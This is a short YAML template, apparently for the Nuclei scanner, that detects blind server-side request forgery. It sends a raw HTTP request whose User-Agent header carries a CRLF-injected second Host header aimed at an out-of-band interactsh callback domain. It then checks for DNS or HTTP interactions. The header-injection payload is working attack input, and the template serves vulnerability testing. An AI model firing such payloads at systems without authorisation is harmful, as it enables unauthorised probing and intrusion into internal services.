id: 0x114

info:
  name: Blind SSRF
  author: reewardius
  severity: high
  tags: ssrf
  
http:
  - raw:
      - |
        GET / HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\r\nHost: {{Host}}.{{Port}}.BSSRF-114.{{interactsh-url}}
        Cache-Control: no-transform
        Accept-Encoding: gzip, deflate
        Accept: */*
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or
